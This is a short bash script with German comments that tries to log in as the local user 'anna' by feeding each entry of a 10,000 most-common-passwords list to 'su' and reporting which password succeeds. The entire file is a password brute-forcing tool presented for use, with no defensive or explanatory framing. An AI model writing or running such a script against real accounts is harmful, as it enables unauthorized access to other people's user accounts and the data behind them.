#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    local count="$2"
    su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        echo "Versuch $count"
        exit 0
    else
        echo "Fehler beim Anmelden als '$username' mit dem Passwort '$password'"
        echo "Versuch $count"
    fi
}

# Zähler für den Fortschritt
attempt_count=0

# Lesen Sie jedes Passwort in der Liste nacheinander ein und überprüfen Sie es
while IFS= read -r password; do
    ((attempt_count++))
    check_password "$password" "$attempt_count"
done < "$password_list_path"

# Wenn kein gültiges Passwort gefunden wurde
echo "Kein gültiges Passwort für '$username' gefunden."
exit 1
